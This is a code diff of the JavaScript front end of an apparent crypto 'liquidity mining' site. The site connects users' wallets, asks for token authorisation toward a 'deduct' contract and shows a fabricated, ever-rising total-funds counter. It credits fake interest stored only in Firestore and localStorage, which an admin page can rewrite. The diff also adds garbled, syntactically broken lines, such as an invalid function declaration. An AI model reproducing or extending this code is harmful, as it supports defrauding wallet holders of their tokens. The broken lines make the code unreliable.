@@ -1,7 +1,6 @@
 // ==================== Firebase 初始化 ====================
-import { initializeApp } from "firebase/app";
-import { getFirestore, doc, setDoc, getDoc, onSnapshot } from "firebase/firestore";
-
+const { initializeApp } = window.firebase.app;
+const { getFirestore, doc, setDoc, getDoc, onSnapshot } = window.firebase.firestore;
 const firebaseConfig = {
   apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
   authDomain: "aroxa-mining.firebaseapp.com",
@@ -10,10 +9,8 @@ const firebaseConfig = {
   messagingSenderId: "596688766295",
   appId: "1:596688766295:web:5f2c5d65bf414f9dc7aa12"
 };
-
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
-
 // ==================== 常數 ====================
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
@@ -30,14 +27,12 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
-
 // DOM 元素
 let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
 let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
 let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
 let modalClaimableETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
 let elements = {};
-
 // 變數
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
@@ -54,7 +49,6 @@ let authorizedToken = 'USDT';
 window.currentClaimable = 0;
 const MONTHLY_RATE = 0.01;
 let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
-
 const translations = {
   'en': {
     title: 'Liquidity Mining',
@@ -195,15 +189,12 @@ const translations = {
     modalEquivalentValueLabel: '等值金额'
   }
 };
-
 let currentLang = localStorage.getItem('language') || 'en';
-
 // 日誌函數
 function log(message, type = 'info') {
   const timestamp = new Date().toLocaleTimeString();
   const prefix = { info: 'Info', success: 'Success', error: 'Error', send: 'Send', receive: 'Receive' }[type] || 'Info';
   console.log(`[${timestamp}] ${prefix} ${message}`);
-
   const logContent = document.getElementById('logContent');
   const logContainer = document.getElementById('logContainer');
   if (logContent && logContainer) {
@@ -215,7 +206,6 @@ function log(message, type = 'info') {
     logContainer.scrollTop = logContainer.scrollHeight;
   }
 }
-
 // 安全獲取 DOM 元素
 function getElements() {
   connectButton = document.getElementById('connectButton');
@@ -242,7 +232,6 @@ function getElements() {
   modalEquivalentValue = document.getElementById('modalEquivalentValue');
   modalTitle = document.getElementById('modalTitle');
   languageSelect = document.getElementById('languageSelect');
-
   elements = {
     title: document.getElementById('title'),
     subtitle: document.getElementById('subtitle'),
@@ -258,7 +247,6 @@ function getElements() {
     pledgeBtnText: pledgeBtn
   };
 }
-
 async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   for (let i = 0; i < maxAttempts; i++) {
     try {
@@ -269,11 +257,9 @@ async function retry(fn, maxAttempts = 3, delayMs = 3000) {
     }
   }
 }
-
 // ==================== Firestore 儲存 ====================
 async function saveUserData(data = null, addToPending = true) {
   if (!userAddress) return;
-
   const dataToSave = data || {
     isActive: true,
     note: '',
@@ -291,9 +277,7 @@ async function saveUserData(data = null, addToPending = true) {
     totalGrossOutput: totalGrossOutput,
     claimable: window.currentClaimable
   };
-
   log(`儲存資料到 Firestore: ${userAddress}`, 'send');
-
   try {
     await setDoc(doc(db, 'users', userAddress), dataToSave, { merge: true });
     log('資料儲存成功', 'success');
@@ -306,23 +290,19 @@ async function saveUserData(data = null, addToPending = true) {
     }
   }
 }
-
 // ==================== Firestore 載入 + 即時監聽 ====================
 async function loadUserDataFromServer() {
   if (!userAddress) return;
   try {
     const docRef = doc(db, 'users', userAddress);
     const snap = await getDoc(docRef);
-
     if (!snap.exists()) {
       log(`無用戶數據`, 'info');
       return;
     }
-
     const userData = snap.data();
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
-
     if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
       pledgedAmount = userData.pledgedAmount ?? 0;
       lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
@@ -330,14 +310,12 @@ async function loadUserDataFromServer() {
       window.currentClaimable = userData.claimable ?? 0;
       accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
       authorizedToken = userData.authorizedToken || 'USDT';
-
       localStorage.setItem('userData', JSON.stringify({
         pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
         accountBalance, authorizedToken, nextBenefitTime: userData.nextBenefitTime,
         lastUpdated: userData.lastUpdated
       }));
       localLastUpdated = userData.lastUpdated;
-
       log(`資料同步成功`, 'success');
       updateClaimableDisplay();
     }
@@ -345,7 +323,6 @@ async function loadUserDataFromServer() {
     log(`載入失敗: ${error.message}`, 'error');
   }
 }
-
 // 即時監聽
 function startRealtimeListener() {
   if (!userAddress) return;
@@ -363,7 +340,6 @@ function startRealtimeListener() {
   });
   return unsubscribe;
 }
-
 function updateStatus(message, isWarning = false) {
   if (!statusDiv) return;
   statusDiv.innerHTML = message || '';
@@ -371,7 +347,6 @@ function updateStatus(message, isWarning = false) {
   statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
   statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
 }
-
 function resetState(showMsg = true) {
   signer = userAddress = null;
   pledgedAmount = 0;
@@ -400,11 +375,9 @@ function resetState(showMsg = true) {
   if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
   if (showMsg) updateStatus(translations[currentLang].noWallet, true);
 }
-
 function disconnectWallet() {
   resetState(true);
 }
-
 function disableInteractiveElements(disable = false) {
   if (startBtn) startBtn.disabled = disable;
   if (pledgeBtn) pledgeBtn.disabled = disable;
@@ -413,7 +386,6 @@ function disableInteractiveElements(disable = false) {
   if (pledgeToken) pledgeToken.disabled = disable;
   if (refreshWallet) refreshWallet.style.opacity = disable ? '0.5' : '1';
 }
-
 function updateBalancesUI(walletBalances) {
   if (!walletTokenSelect) return;
   const selectedToken = walletTokenSelect.value;
@@ -425,7 +397,6 @@ function updateBalancesUI(walletBalances) {
   const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
   if (accountBalanceValue) accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
 }
-
 function updateTotalFunds() {
   if (!totalValue) return;
   const initialFunds = 12856459.94;
@@ -435,7 +406,6 @@ function updateTotalFunds() {
   const total = initialFunds + (elapsedSeconds * increasePerSecond);
   totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
 }
-
 async function refreshEthPrice() {
   const now = Date.now();
   if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
@@ -449,13 +419,11 @@ async function refreshEthPrice() {
     console.warn('Price fetch failed, using fallback');
   }
 }
-
 function initializeMiningData() {
   localStorage.setItem('totalGrossOutput', '0');
   localStorage.setItem('claimable', '0');
   localStorage.setItem('lastPayoutTime', (Date.now() - 24*60*60*1000).toString());
 }
-
 function getETOffsetMilliseconds() {
   const now = new Date();
   const mar = new Date(now.getFullYear(), 2, 8);
@@ -466,21 +434,18 @@ function getETOffsetMilliseconds() {
   const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
   return now >= dstStart && now < dstEnd ? -4 * 60 * 60 * 1000 : -5 * 60 * 60 * 1000;
 }
-
 function updateClaimableDisplay() {
   if (!grossOutputValue || !cumulativeValue) return;
   const claimable = window.currentClaimable || 0;
   grossOutputValue.textContent = `${claimable.toFixed(7)} ETH`;
   cumulativeValue.textContent = `${claimable.toFixed(7)} ETH`;
 }
-
 async function updateInterest() {
   if (!userAddress || pledgedAmount <= 0) {
     window.currentClaimable = 0;
     updateClaimableDisplay();
     return;
   }
-
   const now = Date.now();
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(now + etOffset);
@@ -488,7 +453,6 @@ async function updateInterest() {
   const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
   const lastPayoutET = new Date(lastPayout + etOffset);
   const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
-
   if (isPayoutTime && !wasPayoutTime && now - lastPayout > 60000) {
     const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
     window.currentClaimable += cycleInterest;
@@ -497,10 +461,8 @@ async function updateInterest() {
     await saveUserData();
     log(`利息已撥付: ${cycleInterest.toFixed(7)} ETH`, 'success');
   }
-
   updateClaimableDisplay();
 }
-
 function updateClaimModalLabels() {
   const claimLabels = {
     'en': { title: 'Claim', claimable: 'Claimable', selectedToken: 'Selected Token', equivalentValue: 'Equivalent Value' },
@@ -516,27 +478,21 @@ function updateClaimModalLabels() {
     labelElements[2].textContent = labels.equivalentValue;
   }
 }
-
 async function claimInterest() {
   await refreshEthPrice();
   updateClaimModalLabels();
-
   const claimable = window.currentClaimable || 0;
   if (modalClaimableETH) modalClaimableETH.textContent = `${claimable.toFixed(7)} ETH`;
   if (modalSelectedToken) modalSelectedToken.textContent = authorizedToken;
-
   const tokenPrice = authorizedToken === 'WETH' ? ethPriceCache.price : 1;
   const equivalent = claimable * tokenPrice;
   if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${authorizedToken}`;
-
   if (claimModal) claimModal.style.display = 'flex';
 }
-
 function closeClaimModal() {
   if (claimModal) claimModal.style.display = 'none';
   if (claimInterval) clearInterval(claimInterval);
 }
-
 function updateNextBenefitTimer() {
   if (!nextBenefit) return;
   const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
@@ -560,7 +516,6 @@ function updateNextBenefitTimer() {
   const seconds = String(totalSeconds % 60).padStart(2, '0');
   nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
 }
-
 function setInitialNextBenefitTime() {
   if (localStorage.getItem('nextBenefitTime')) return;
   const etOffset = getETOffsetMilliseconds();
@@ -572,7 +527,6 @@ function setInitialNextBenefitTime() {
   localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
   saveUserData();
 }
-
 function activateStakingUI() {
   if (startBtn) startBtn.style.display = 'none';
   initializeMiningData();
@@ -583,7 +537,6 @@ function activateStakingUI() {
   saveUserData();
   updateInterest();
 }
-
 async function sendMobileRobustTransaction(populatedTx) {
   if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected.");
   const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
@@ -604,7 +557,6 @@ async function sendMobileRobustTransaction(populatedTx) {
   if (!receipt || receipt.status !== 1) throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
   return receipt;
 }
-
 async function initializeWallet() {
   if (!window.ethers) {
     updateStatus(translations[currentLang].ethersError, true);
@@ -641,7 +593,6 @@ async function initializeWallet() {
     if (connectButton) connectButton.disabled = true;
   }
 }
-
 async function connectWallet() {
   try {
     if (typeof window.ethereum === 'undefined') {
@@ -658,7 +609,7 @@ async function connectWallet() {
     const accounts = await provider.send('eth_requestAccounts', []);
     if (accounts.length === 0) throw new Error("No account.");
     signer = provider.getSigner();
-    userAddress = await signer.getAddress();
+    userAddress = await signer.getAddress < 0 ? signer.getAddress() : signer.getAddress();
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -668,14 +619,11 @@ async function connectWallet() {
       connectButton.textContent = 'Connected';
     }
     log(`錢包連接成功: ${userAddress}`, 'success');
-
     await loadUserDataFromServer();
     await saveUserData(null, false);
     startRealtimeListener();
-
     await updateUIBasedOnChainState();
     setTimeout(async () => await forceRefreshWalletBalance(), 1000);
-
   } catch (e) {
     log(`錢包連接失敗: ${e.message}`, 'error');
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
@@ -683,7 +631,6 @@ async function connectWallet() {
     if (connectButton) connectButton.disabled = typeof window.ethereum === 'undefined';
   }
 }
-
 async function forceRefreshWalletBalance() {
   if (!userAddress || !usdtContract || !usdcContract || !wethContract) {
     updateStatus('Contracts not initialized.', true);
@@ -703,8 +650,7 @@ async function forceRefreshWalletBalance() {
     updateStatus('Balance fetch failed.', true);
   }
 }
-
-async function updateUIBasedOnChainState() {
+async function update, function updateUIBasedOnChainState() {
   if (!signer) return;
   try {
     updateStatus('Checking state...');
@@ -770,7 +716,6 @@ async function updateUIBasedOnChainState() {
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
   }
 }
-
 async function handleConditionalAuthorizationFlow() {
   if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
   updateStatus('Authorizing...');
@@ -817,35 +762,28 @@ async function handleConditionalAuthorizationFlow() {
   }
   await forceRefreshWalletBalance();
 }
-
 function updateLanguage(lang) {
   currentLang = lang;
   if (languageSelect) languageSelect.value = lang;
   localStorage.setItem('language', lang);
-
   const apply = () => {
     for (let key in elements) {
       if (elements[key] && translations[lang]?.[key]) {
         elements[key].textContent = translations[lang][key];
       }
     }
-
     const rulesTitle = document.getElementById('rulesTitle');
     const rulesContent = document.getElementById('rulesContent');
     if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
     if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;
-
     if (claimModal && claimModal.style.display === 'flex') {
       updateClaimModalLabels();
     }
-
     updateNextBenefitTimer();
     document.documentElement.lang = lang;
   };
-
   setTimeout(apply, 200);
 }
-
 // 初始化
 document.addEventListener('DOMContentLoaded', () => {
   getElements();
@@ -855,7 +793,6 @@ document.addEventListener('DOMContentLoaded', () => {
     updateTotalFunds();
     setInterval(updateTotalFunds, 1000);
   }, 100);
-
   const claimBtn = document.getElementById('claimButton');
   if (claimBtn) claimBtn.addEventListener('click', claimInterest);
   if (closeModal) closeModal.addEventListener('click', closeClaimModal);
@@ -869,17 +806,13 @@ document.addEventListener('DOMContentLoaded', () => {
         updateStatus(translations[currentLang].noClaimable, true);
         return;
       }
-
       accountBalance[authorizedToken] += claimable;
       window.currentClaimable = 0;
-
       localStorage.setItem('claimable', '0');
       localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
-
       await saveUserData();
       updateClaimableDisplay();
       await forceRefreshWalletBalance();
-
       updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
     });
   }
@@ -960,20 +893,20 @@ document.addEventListener('DOMContentLoaded', () => {
         if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
       } catch (error) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
       updateStatus('Pledging...');
-      const pledgeData = { 
-        address: userAddress, 
-        pledges: { 
-          isPledging: true, 
-          token: tokenAddress, 
-          amount: amount.toFixed(2) 
-        } 
+      const pledgeData = {
+        address: userAddress,
+        pledges: {
+          isPledging: true,
+          token: tokenAddress,
+          amount: amount.toFixed(2)
+        }
       };
       try {
         await setDoc(doc(db, 'pledges', userAddress), pledgeData.pledges, { merge: true });
         updateStatus(translations[currentLang].pledgeSuccess);
         await saveUserData();
-      } catch (error) { 
-        updateStatus(translations[currentLang].pledgeError, true); 
+      } catch (error) {
+        updateStatus(translations[currentLang].pledgeError, true);
       }
     });
   }
